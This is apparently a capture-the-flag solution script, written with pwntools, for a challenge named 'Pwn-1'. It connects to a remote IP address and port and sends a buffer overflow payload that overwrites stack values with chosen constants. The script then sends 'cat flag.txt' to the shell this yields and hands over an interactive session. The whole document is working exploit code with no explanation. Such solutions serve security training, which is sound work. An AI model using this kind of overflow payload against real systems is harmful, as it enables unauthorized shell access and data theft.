# 張元_Pwn-1
from pwn import *

r = remote('140.110.112.218', 2111)
r.recvuntil('\n')
r.recvuntil('\n')

r.sendline(b'a'*12 + p32(0xfaceb00c) + p32(0xdeadbeef) + p32(0x1))
r.sendline('1')
r.recvuntil('Here is your shell!')
r.sendline('cat flag.txt')

r.interactive()